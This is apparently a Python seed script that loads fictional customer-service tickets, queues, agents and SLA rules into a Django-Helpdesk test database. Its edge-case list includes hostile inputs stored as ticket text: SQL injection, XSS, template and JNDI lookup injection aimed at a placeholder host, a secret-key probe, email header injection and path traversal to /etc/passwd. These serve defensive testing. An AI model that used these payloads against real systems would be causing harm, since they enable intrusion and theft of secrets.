#!/usr/bin/env python
"""
Massa de dados fictícia: SAC omnichannel para o Django-Helpdesk.

Cenário: a "OmniCorp Brasil" (empresa inventada) atende varejo, telecom, energia e banco
por Chat 24h, WhatsApp, 0800/URA e Ouvidoria. Nenhum nome, CPF, e-mail ou telefone é real:
e-mails usam o domínio reservado .invalid e os CPFs têm dígito verificador inválido de propósito.

IMPORTANTE: os prazos (SLA) abaixo são ILUSTRATIVOS. Prazos regulatórios reais (ANATEL, ANEEL,
BACEN, CDC) dependem da norma vigente. Confirme antes de usar como requisito.

Uso (da pasta seed/, com o django-helpdesk instalado ou em PYTHONPATH):

    DJANGO_SETTINGS_MODULE=sac_settings python seed_sac_omnichannel.py --migrate --reset
    DJANGO_SETTINGS_MODULE=sac_settings python seed_sac_omnichannel.py --reset --volume 2000 --burst 500

Opções:
    --migrate   roda as migrações antes (banco novo)
    --reset     apaga o que este script criou (prefixo sac-/sac_) e recria
    --volume N  tickets "do dia a dia" (padrão 300)
    --burst N   pico: N tickets de falta de energia em 15 minutos (padrão 150)
    --seed N    semente do gerador (padrão 2026): mesma semente, mesma massa
"""
import argparse
import datetime as dt
import json
import os
import random
import sys
from zoneinfo import ZoneInfo

# --------------------------------------------------------------------------------------
# Catálogo do cenário
# --------------------------------------------------------------------------------------
BRT = ZoneInfo("America/Sao_Paulo")
DOMINIO = "seed.sac.invalid"          # .invalid nunca resolve: seguro contra envio real
SENHA_PADRAO = "SenhaDeTeste!2026"    # fictícia, só para o ambiente de teste

# setor -> (fila, título, público?, dias de escalonamento, usa feriados?)
FILAS = [
    dict(slug="sac-varejo-pedidos", title="Varejo | Pedidos e Entregas", setor="varejo",
         publica=True, escalate_days=2, feriados=True),
    dict(slug="sac-varejo-reembolso", title="Varejo | Reembolso, Cancelamento e Troca", setor="varejo",
         publica=True, escalate_days=3, feriados=True),
    dict(slug="sac-telecom-sinal", title="Telecom | Emergência 24h (sem sinal)", setor="telecom",
         publica=True, escalate_days=1, feriados=False),
    dict(slug="sac-energia-emergencia", title="Energia | Emergência 24h (falta de energia)", setor="energia",
         publica=True, escalate_days=1, feriados=False),
    dict(slug="sac-banco-sac", title="Banco | SAC (reclamações e cancelamentos)", setor="banco_sac",
         publica=True, escalate_days=3, feriados=True),
    dict(slug="sac-banco-transacional", title="Banco | Transacional (fraude e bloqueio)", setor="banco_trans",
         publica=False, escalate_days=1, feriados=False),
    dict(slug="sac-ouvidoria", title="Ouvidoria | Casos sigilosos", setor="ouvidoria",
         publica=False, escalate_days=5, feriados=True),
]

# SLA ILUSTRATIVO em horas por (setor, prioridade 1..5). Prioridade 1 = mais alta.
SLA_HORAS = {
    "varejo":      {1: 8,  2: 24, 3: 72,  4: 120, 5: 240},
    "telecom":     {1: 4,  2: 12, 3: 48,  4: 96,  5: 240},
    "energia":     {1: 3,  2: 8,  3: 48,  4: 96,  5: 240},
    "banco_sac":   {1: 24, 2: 48, 3: 120, 4: 240, 5: 360},
    "banco_trans": {1: 1,  2: 4,  3: 24,  4: 48,  5: 96},
    "ouvidoria":   {1: 48, 2: 96, 3: 240, 4: 360, 5: 480},
}

CANAIS = ["chat_24h", "whatsapp", "ura_0800", "ouvidoria"]
CANAIS_POR_SETOR = {
    "varejo": ["chat_24h", "whatsapp", "ura_0800"],
    "telecom": ["ura_0800", "whatsapp", "chat_24h"],
    "energia": ["ura_0800", "whatsapp"],
    "banco_sac": ["chat_24h", "whatsapp", "ura_0800", "ouvidoria"],
    "banco_trans": ["chat_24h", "ura_0800"],
    "ouvidoria": ["ouvidoria"],
}

# Modelos de ticket (título, corpo, prioridade típica). {n} = número do pedido/contrato.
MODELOS = {
    "sac-varejo-pedidos": [
        ("Pedido {n} não chegou", "Comprei há 12 dias e o prazo de entrega venceu. Rastreio parado.", 3),
        ("Cancelar pedido {n} em trânsito", "O pedido já saiu para entrega mas quero cancelar. Direito de arrependimento.", 2),
        ("Produto errado no pedido {n}", "Recebi um item diferente do que comprei.", 3),
        ("Entrega em endereço errado, pedido {n}", "O pedido foi entregue para outra pessoa.", 2),
    ],
    "sac-varejo-reembolso": [
        ("Reembolso do pedido {n} não caiu", "Cancelei e ainda não recebi o estorno no cartão.", 2),
        ("Troca de produto com defeito, pedido {n}", "Produto veio com defeito dentro do prazo legal de 7 dias.", 3),
        ("Estorno parcial no pedido {n}", "Reembolsaram menos do que paguei.", 3),
    ],
    "sac-telecom-sinal": [
        ("Sem sinal há 6 horas no contrato {n}", "Moro em área urbana, sem sinal de voz e dados desde a manhã.", 1),
        ("Internet fixa fora do ar, contrato {n}", "Luz do modem vermelha. Trabalho de casa e preciso do serviço.", 2),
        ("Sem sinal e preciso chamar o SAMU, contrato {n}", "Estou sem sinal e há um idoso passando mal na minha casa.", 1),
        ("Cobrança indevida na fatura do contrato {n}", "Valor diferente do plano contratado.", 4),
    ],
    "sac-energia-emergencia": [
        ("Falta de energia na rua toda, instalação {n}", "Sem luz desde as 18h, toda a rua está no escuro.", 1),
        ("Fio caído na calçada, instalação {n}", "Cabo de alta tensão no chão, risco de choque. Já isolei a área.", 1),
        ("Oscilação de energia queimou aparelhos, instalação {n}", "Pedido de ressarcimento de equipamentos danificados.", 2),
        ("Segunda via de conta, instalação {n}", "Preciso da segunda via da conta de luz.", 5),
    ],
    "sac-banco-sac": [
        ("Cancelamento da conta {n}", "Solicito o encerramento da conta e dos serviços vinculados.", 3),
        ("Reclamação de tarifa na conta {n}", "Cobraram tarifa que não contratei.", 3),
        ("Cartão cancelado sem aviso, conta {n}", "O cartão foi cancelado e não fui comunicado.", 2),
    ],
    "sac-banco-transacional": [
        ("Cartão clonado, conta {n}", "Compras que não reconheço. CPF 123.456.789-00. Bloqueiem agora.", 1),
        ("Transferência não reconhecida, conta {n}", "Pix de valor alto para destinatário desconhecido.", 1),
        ("Bloqueio indevido de conta {n}", "Conta bloqueada e preciso pagar um boleto hoje.", 2),
    ],
    "sac-ouvidoria": [
        ("Reclamação em segunda instância, protocolo {n}", "Meu caso foi encerrado sem solução. Peço revisão pela Ouvidoria.", 3),
        ("Denúncia de atendimento abusivo, protocolo {n}", "Fui tratado com desrespeito. Dados do atendente em anexo.", 2),
        ("Pedido de exclusão de dados (LGPD), protocolo {n}", "Solicito exclusão e portabilidade dos meus dados pessoais.", 3),
    ],
}

# Casos de borda fixos: (rótulo, título, corpo, e-mail do solicitante, fila). Cada um mira um risco.
BORDAS = [
    ("injecao_sql", "'; DROP TABLE helpdesk_ticket; --", "' OR '1'='1' -- ", "sql@%s" % DOMINIO, "sac-banco-sac"),
    ("xss_basico", "<script>alert('xss')</script>", "<img src=x onerror=alert(1)>", "xss@%s" % DOMINIO, "sac-varejo-pedidos"),
    ("xss_markdown", "[clique](javascript:alert(1))", "![x](javascript:alert(1)) <svg onload=alert(1)>", "xss2@%s" % DOMINIO, "sac-varejo-pedidos"),
    ("template_injection", "{{ 7*7 }} {% load os %}", "${jndi:ldap://x.invalid/a} {{settings.SECRET_KEY}}", "ssti@%s" % DOMINIO, "sac-varejo-reembolso"),
    ("crlf_no_titulo", "Assunto\r\nBcc: alvo@%s" % DOMINIO, "tentativa de injeção de cabeçalho de e-mail", "crlf@%s" % DOMINIO, "sac-telecom-sinal"),
    ("path_traversal", "../../../etc/passwd", "..\\..\\windows\\system32", "path@%s" % DOMINIO, "sac-ouvidoria"),
    ("formato_printf", "%s%s%s%n%x%x", "%(nome)s %d {0} {}", "fmt@%s" % DOMINIO, "sac-varejo-pedidos"),
    ("titulo_200", "T" * 200, "limite exato do título", "lim200@%s" % DOMINIO, "sac-varejo-pedidos"),
    ("titulo_201", "T" * 201, "um acima do limite (o save trunca)", "lim201@%s" % DOMINIO, "sac-varejo-pedidos"),
    ("titulo_5000", "T" * 5000, "muito acima do limite", "lim5000@%s" % DOMINIO, "sac-varejo-pedidos"),
    ("corpo_gigante", "Corpo grande", "A" * 200_000, "big@%s" % DOMINIO, "sac-banco-sac"),
    ("corpo_vazio", "Sem corpo", "", "vazio@%s" % DOMINIO, "sac-banco-sac"),
    ("corpo_so_espacos", "Só espaços", "   \n\t  ", "espaco@%s" % DOMINIO, "sac-banco-sac"),
    ("emoji_e_cjk", "Cadê meu pedido 😡📦 注文はどこ", "Já faz 15 dias 😤😤😤 配送が遅い", "emoji@%s" % DOMINIO, "sac-varejo-pedidos"),
    ("rtl_override", "‮OCIDEP ON‬", "texto com override de direção ‮gnirts", "rtl@%s" % DOMINIO, "sac-varejo-pedidos"),  # nosec B613
    ("acentos_nfc_nfd", "Reclamação", "Reclamação (decomposto)", "nfd@%s" % DOMINIO, "sac-banco-sac"),
    ("controle_ascii", "Ctrl\x01\x02\x1f", "bytes de controle \x07\x08\x0b\x0c", "ctrl@%s" % DOMINIO, "sac-telecom-sinal"),
    ("email_maiusculo", "E-mail em maiúsculas", "para testar comparação de e-mail", "CLIENTE.MAIUSCULO@%s" % DOMINIO.upper(), "sac-varejo-pedidos"),
    ("email_plus", "E-mail com sufixo", "plus addressing", "cliente+teste@%s" % DOMINIO, "sac-varejo-pedidos"),
    ("email_vazio", "Sem e-mail", "solicitante sem e-mail (ligação na URA)", "", "sac-telecom-sinal"),
    ("pii_no_texto", "Dados sensíveis no corpo", "Meu CPF é 123.456.789-00, cartão 4111 1111 1111 1111, senha: abc123, tel (21) 99999-0000", "pii@%s" % DOMINIO, "sac-banco-transacional"),
    ("falso_emergencia", "URGENTE URGENTE URGENTE!!!", "Quero a segunda via da conta, mas escrevi urgente para ser atendido logo.", "falso@%s" % DOMINIO, "sac-energia-emergencia"),
    ("emergencia_disfarcada", "Dúvida sobre fatura", "Aliás, tem um poste caído soltando faísca em frente à escola, ninguém avisou.", "disfarce@%s" % DOMINIO, "sac-energia-emergencia"),
    ("emergencia_sem_palavras", "Ajuda", "minha mãe usa respirador elétrico e a luz acabou faz 40 minutos", "respirador@%s" % DOMINIO, "sac-energia-emergencia"),
    ("negacao", "Não é urgente", "Não estou sem energia, só quero saber o horário de leitura do medidor.", "neg@%s" % DOMINIO, "sac-energia-emergencia"),
    ("fraude_sem_palavras", "Conta", "apareceu uma compra de 4 mil reais em Dubai e eu nunca saí do Brasil", "fraude@%s" % DOMINIO, "sac-banco-transacional"),
    ("ouvidoria_ameaca_juridica", "Vou ao Procon e à Justiça", "Esta é a terceira reclamação. Exijo resposta em 24h ou aciono o Procon, o Banco Central e a imprensa.", "procon@%s" % DOMINIO, "sac-ouvidoria"),
]

FERIADOS_FIXOS = [(1, 1, "Confraternização Universal"), (4, 21, "Tiradentes"), (5, 1, "Dia do Trabalho"),
                  (9, 7, "Independência"), (10, 12, "N. Sra. Aparecida"), (11, 2, "Finados"),
                  (11, 15, "Proclamação da República"), (11, 20, "Consciência Negra"), (12, 25, "Natal")]


def pascoa(ano):
    a, b, c = ano % 19, ano // 100, ano % 100
    d, e = b // 4, b % 4
    f = (b + 8) // 25
    g = (b - f + 1) // 3
    h = (19 * a + b - d - g + 15) % 30
    i, k = c // 4, c % 4
    l = (32 + 2 * e + 2 * i - h - k) % 7
    m = (a + 11 * h + 22 * l) // 451
    mes = (h + l - 7 * m + 114) // 31
    dia = ((h + l - 7 * m + 114) % 31) + 1
    return dt.date(ano, mes, dia)


def feriados(ano):
    p = pascoa(ano)
    lista = [(dt.date(ano, m, d), n) for m, d, n in FERIADOS_FIXOS]
    lista += [(p - dt.timedelta(days=2), "Sexta-feira Santa"), (p + dt.timedelta(days=60), "Corpus Christi")]
    return sorted(lista)


def cpf_sintetico(rng):
    """Formato de CPF com dígito verificador inválido (-00): nunca pertence a ninguém."""
    return "%03d.%03d.%03d-00" % (rng.randint(0, 999), rng.randint(0, 999), rng.randint(0, 999))


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--migrate", action="store_true")
    ap.add_argument("--reset", action="store_true")
    ap.add_argument("--volume", type=int, default=300)
    ap.add_argument("--burst", type=int, default=150)
    ap.add_argument("--seed", type=int, default=2026)
    ap.add_argument("--senha", default=SENHA_PADRAO)
    args = ap.parse_args()

    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "sac_settings")
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import django
    django.setup()
    if args.migrate:
        from django.core.management import call_command
        call_command("migrate", verbosity=0)

    from django.contrib.auth import get_user_model
    from django.contrib.auth.models import Group, Permission
    from django.db import transaction
    from django.utils import timezone
    from helpdesk.models import (CustomField, EscalationExclusion, FollowUp, Queue, Ticket,
                                 TicketCustomFieldValue)

    User = get_user_model()
    rng = random.Random(args.seed)
    agora = timezone.now()

    def aleatorio_recente(dias_max=30):
        """Mais tickets recentes que antigos."""
        d = rng.random() ** 2 * dias_max
        return agora - dt.timedelta(days=d, minutes=rng.randint(0, 1439))

    with transaction.atomic():
        # ---------------- reset ----------------
        if args.reset:
            # Fila por fila: Queue.delete() remove a permissão queue_access_*. O delete em lote
            # (queryset.delete) deixa a permissão órfã e a recriação da fila estoura IntegrityError
            # (defeito do produto, ver relatório F-04).
            for q_antiga in Queue.objects.filter(slug__startswith="sac-"):
                q_antiga.delete()                                       # cascata: tickets, followups
            Permission.objects.filter(codename__startswith="queue_access_sac-").delete()
            EscalationExclusion.objects.filter(name__startswith="[seed]").delete()
            CustomField.objects.filter(name__in=["canal", "protocolo", "cpf_titular", "regulado"]).delete()
            User.objects.filter(username__startswith="sac_").delete()
            Group.objects.filter(name__startswith="sac-").delete()

        # ---------------- filas ----------------
        filas = {}
        for f in FILAS:
            q, _ = Queue.objects.update_or_create(
                slug=f["slug"],
                defaults=dict(title=f["title"], allow_public_submission=f["publica"],
                              escalate_days=f["escalate_days"], email_address="sac@%s" % DOMINIO))
            filas[f["slug"]] = q

        # ---------------- usuários e permissões por fila ----------------
        def perm(slug):
            return Permission.objects.get(codename=f"queue_access_{slug}")

        def usuario(nome, filas_ok, superuser=False):
            u, _ = User.objects.get_or_create(username=nome, defaults=dict(email=f"{nome}@{DOMINIO}"))
            u.is_staff, u.is_superuser, u.is_active = True, superuser, True
            u.set_password(args.senha)
            u.save()
            g, _ = Group.objects.get_or_create(name=f"sac-{nome.removeprefix('sac_')}")
            g.permissions.set([perm(s) for s in filas_ok])
            u.groups.set([g])
            return u

        por_setor = {}
        for f in FILAS:
            por_setor.setdefault(f["setor"], []).append(f["slug"])
        agentes = {}
        for setor, slugs in por_setor.items():
            agentes[setor] = [usuario(f"sac_{setor}_{i}", slugs) for i in (1, 2)]
        usuario("sac_supervisor_varejo", por_setor["varejo"])
        usuario("sac_admin", [], superuser=True)

        # ---------------- campos personalizados ----------------
        def campo(nome, **kw):
            c, _ = CustomField.objects.update_or_create(name=nome, defaults=kw)
            return c
        c_canal = campo("canal", label="Canal", data_type="list", list_values="\n".join(CANAIS), ordering=1)
        c_prot = campo("protocolo", label="Protocolo", data_type="varchar", max_length=30, ordering=2, staff_only=True)
        c_cpf = campo("cpf_titular", label="CPF do titular", data_type="varchar", max_length=14, ordering=3, staff_only=True)
        c_reg = campo("regulado", label="Sujeito a SLA regulatório", data_type="boolean", ordering=4, staff_only=True)

        # ---------------- exclusões de escalonamento (feriados e fins de semana) ----------------
        usam = [filas[f["slug"]] for f in FILAS if f["feriados"]]
        hoje = timezone.localdate()
        n_excl = 0
        for ano in {hoje.year, hoje.year - 1, hoje.year + 1}:
            for data, nome in feriados(ano):
                e = EscalationExclusion.objects.create(name=f"[seed] {nome}", date=data)
                e.queues.set(usam)       # SÓ as filas de horário comercial; energia/telecom/transacional ficam de fora
                n_excl += 1
        d = hoje - dt.timedelta(days=60)
        while d <= hoje + dt.timedelta(days=30):
            if d.weekday() >= 5:
                e = EscalationExclusion.objects.create(name="[seed] Fim de semana", date=d)
                e.queues.set(usam)
                n_excl += 1
            d += dt.timedelta(days=1)

        # ---------------- tickets ----------------
        def cria(fila, titulo, corpo, email, prioridade, canal, criado, status=None, atribuir=True, regulado=None):
            setor = next(f["setor"] for f in FILAS if f["slug"] == fila.slug)
            if status is None:
                status = rng.choices([1, 2, 3, 4, 5], weights=[50, 8, 18, 22, 2])[0]
            titulo_salvo = titulo if len(titulo) <= 200 else titulo[:197] + "..."   # bulk_create ignora Ticket.save
            dono = rng.choice(agentes[setor]) if atribuir and rng.random() < 0.6 else None
            horas = SLA_HORAS[setor][prioridade]
            return Ticket(title=titulo_salvo, queue=fila, description=corpo, submitter_email=email or None,
                          priority=prioridade, status=status, assigned_to=dono,
                          due_date=criado + dt.timedelta(hours=horas),
                          on_hold=(status in (1, 2) and rng.random() < 0.04)), criado, canal, regulado

        lote = []
        for _ in range(args.volume):
            f = rng.choice(FILAS)
            titulo_t, corpo_t, prio = rng.choice(MODELOS[f["slug"]])
            n = rng.randint(100000, 999999)
            prio = max(1, min(5, prio + rng.choice([0, 0, 0, 1, -1])))
            lote.append(cria(filas[f["slug"]], titulo_t.format(n=n), corpo_t,
                             f"cliente{rng.randint(1, 4000)}@{DOMINIO}", prio,
                             rng.choice(CANAIS_POR_SETOR[f["setor"]]), aleatorio_recente(),
                             regulado=f["setor"] in ("telecom", "energia", "banco_trans")))
        for rotulo, titulo, corpo, email, slug in BORDAS:
            f = next(x for x in FILAS if x["slug"] == slug)
            lote.append(cria(filas[slug], titulo, corpo, email, 3, rng.choice(CANAIS_POR_SETOR[f["setor"]]),
                             aleatorio_recente(10), status=1, atribuir=False))
        # pico: apagão em 15 minutos na fila de energia
        for i in range(args.burst):
            t = agora - dt.timedelta(minutes=rng.randint(0, 15), seconds=rng.randint(0, 59))
            lote.append(cria(filas["sac-energia-emergencia"], f"Falta de energia, instalação {rng.randint(100000, 999999)}",
                             "Sem luz no bairro desde agora.", f"apagao{i}@{DOMINIO}", 1,
                             rng.choice(["ura_0800", "whatsapp"]), t, status=1, atribuir=False, regulado=True))
        # duplicados exatos (cliente reenviando)
        for _ in range(10):
            base = rng.choice(lote)[0]
            lote.append((Ticket(title=base.title, queue=base.queue, description=base.description,
                                submitter_email=base.submitter_email, priority=base.priority, status=1,
                                due_date=base.due_date), agora - dt.timedelta(minutes=rng.randint(1, 30)),
                         "chat_24h", None))

        Ticket.objects.bulk_create([t for t, *_ in lote])
        # auto_now_add força 'created' = agora no bulk_create; corrigimos em seguida
        criados = list(Ticket.objects.filter(queue__slug__startswith="sac-").order_by("id"))
        criados = criados[-len(lote):]
        for tk, (_, criado, *_r) in zip(criados, lote):
            tk.created = criado
            tk.modified = criado
        Ticket.objects.bulk_update(criados, ["created", "modified"])

        valores, followups = [], []
        for tk, (_, criado, canal, regulado) in zip(criados, lote):
            valores.append(TicketCustomFieldValue(ticket=tk, field=c_canal, value=canal))
            valores.append(TicketCustomFieldValue(ticket=tk, field=c_prot, value=f"SAC{tk.pk:08d}"))
            valores.append(TicketCustomFieldValue(ticket=tk, field=c_cpf, value=cpf_sintetico(rng)))
            if regulado is not None:
                valores.append(TicketCustomFieldValue(ticket=tk, field=c_reg, value="True" if regulado else "False"))
            if rng.random() < 0.25:
                followups.append(FollowUp(ticket=tk, date=criado + dt.timedelta(hours=rng.randint(1, 20)),
                                          title="Resposta do cliente", public=True,
                                          comment="Continuo sem solução, favor retornar."))
            if rng.random() < 0.15 and tk.assigned_to_id:
                followups.append(FollowUp(ticket=tk, date=criado + dt.timedelta(hours=rng.randint(1, 20)),
                                          title="Nota interna", public=False, user=tk.assigned_to,
                                          comment=f"Cliente confirmou CPF {cpf_sintetico(rng)} e e-mail pessoal. NÃO compartilhar."))
        TicketCustomFieldValue.objects.bulk_create(valores, batch_size=500)
        FollowUp.objects.bulk_create(followups, batch_size=500)

    resumo = {
        "filas": len(FILAS), "usuarios": User.objects.filter(username__startswith="sac_").count(),
        "tickets": Ticket.objects.filter(queue__slug__startswith="sac-").count(),
        "tickets_por_fila": {q.slug: q.ticket_set.count() for q in Queue.objects.filter(slug__startswith="sac-")},
        "casos_de_borda": len(BORDAS), "pico_energia": args.burst, "exclusoes_de_escalonamento": n_excl,
        "followups": len(followups), "senha_dos_usuarios": args.senha,
        "usuarios_exemplo": ["sac_admin", "sac_varejo_1", "sac_banco_trans_1", "sac_ouvidoria_1", "sac_supervisor_varejo"],
    }
    print(json.dumps(resumo, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
